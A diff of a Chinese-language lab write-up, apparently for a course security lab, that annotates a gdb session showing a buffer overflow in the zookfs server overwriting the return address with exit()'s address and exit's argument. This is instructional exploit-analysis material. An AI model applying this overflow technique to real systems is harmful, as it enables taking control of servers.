@@ -344,7 +344,7 @@ def build_exploit(shellcode):
 
 ```
 
-用`gdb`调试：
+用`gdb`调试来演示攻击过程与结果：
 
 ``` gas
 $ gdb -p $(pgrep zookfs)
@@ -369,7 +369,7 @@ warning: Source file is more recent than executable.
 282         strcat(pn, name);
 (gdb)
 283         split_path(pn);
-(gdb) x/10s pn     [查看buffer]
+(gdb) x/10s pn        [查看buffer]
 0xbfffd9fc:     "/home/httpd/lab/", 'A' <repeats 184 times>...
 0xbfffdac4:     'A' <repeats 200 times>...
 0xbfffdb8c:     'A' <repeats 200 times>...
@@ -380,11 +380,11 @@ warning: Source file is more recent than executable.
 0xbfffde1b:     ""
 0xbfffde1c:     ",\376\377\277"
 0xbfffde21:     ""
-(gdb) p handler     [查看handler是否被改写]
+(gdb) p handler       [查看handler是否被改写]
 $1 = (void (*)(int, const char *)) 0x80495ea <http_serve_none>
-(gdb) x/wx $ebp+4     [查看返回地址]
+(gdb) x/wx $ebp+4     [查看返回地址，已经被改为exit()地址]
 0xbfffde0c:     0x40058150
-(gdb) x $ebp+12    [查看exit()参数]
+(gdb) x $ebp+12       [查看exit()参数，表明攻击成功]
 0xbfffde14:     0x01010101
 (gdb) n
 285         if (!stat(pn, &st))
@@ -392,7 +392,7 @@ $1 = (void (*)(int, const char *)) 0x80495ea <http_serve_none>
 296         handler(fd, pn);
 (gdb)
 297     }
-(gdb)                [继续执行到exit]
+(gdb)                 [继续执行到exit]
 __GI_exit (status=16843009) at exit.c:103
 103     exit.c: No such file or directory.
 (gdb)
